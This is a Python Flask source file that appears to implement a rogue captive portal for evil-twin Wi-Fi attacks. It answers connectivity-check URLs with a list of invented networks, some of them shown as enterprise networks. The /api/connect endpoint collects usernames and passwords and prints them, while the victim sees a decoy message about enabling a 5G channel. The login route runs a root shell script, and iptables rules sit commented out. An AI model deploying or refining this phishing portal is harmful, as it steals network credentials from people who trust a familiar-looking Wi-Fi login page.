from flask import Flask, render_template, request, redirect, jsonify
import subprocess

app = Flask(__name__, static_url_path='/static', static_folder='static', template_folder='templates')

def network_list():
    #ssid, signal, secured
    return [
        {"ssid": "Campus_Free_WiFi", "signal": 4, "secured": True, "enterprise": False},
        {"ssid": "Office_5G", "signal": 3, "secured": True, "enterprise": False},
        {"ssid": "Guest_Network", "signal": 2, "secured": True, "enterprise": False},
        {"ssid": "Home_Private", "signal": 4, "secured": True, "enterprise": False},
        {"ssid": "Staff_WiFi", "signal": 4, "secured": True, "enterprise": True}
    ]

@app.route('/')
def index():
    fake_networks = network_list()
    return render_template('index.html', fake_networks=fake_networks)

@app.route('/hotspot-detect.html')
def index2():
    fake_networks = network_list()
    return render_template('index.html', fake_networks=fake_networks)

@app.route('/generate_204')
@app.route('/generate_204/')
def index1():
    fake_networks = network_list()
    return render_template('index.html', fake_networks=fake_networks)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    client_ip = request.remote_addr
    print(f"[+] New captive login: {username} from {client_ip}")

    """
        subprocess.run([
        "sudo", "iptables", "-t", "nat", "-I", "PREROUTING", "1",
        "-s", client_ip, "-j", "RETURN"
        ], stderr=subprocess.DEVNULL)

        subprocess.run([
            "sudo", "iptables", "-I", "FORWARD", "1",
            "-s", client_ip, "-j", "ACCEPT"
        ], stderr=subprocess.DEVNULL)
    """
    subprocess.run(["sudo", "bash", "start_captive.sh"], stderr=subprocess.DEVNULL)
    return redirect("https://google.com")

@app.route("/api/networks")
def api_networks():
    fake_networks = network_list()
    return jsonify(fake_networks)


@app.route("/api/connect", methods=["POST"])
def api_connect():
    data = request.get_json()
    ssid = data.get("ssid")
    username = data.get("username")
    password = data.get("password")
    print(f"[+] Connect request for {ssid} with\nusername: {username} \npassword: {password or '(none)'}")

    return jsonify({"message": f"Enabling 5G channel on your network for {ssid}..."})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=True)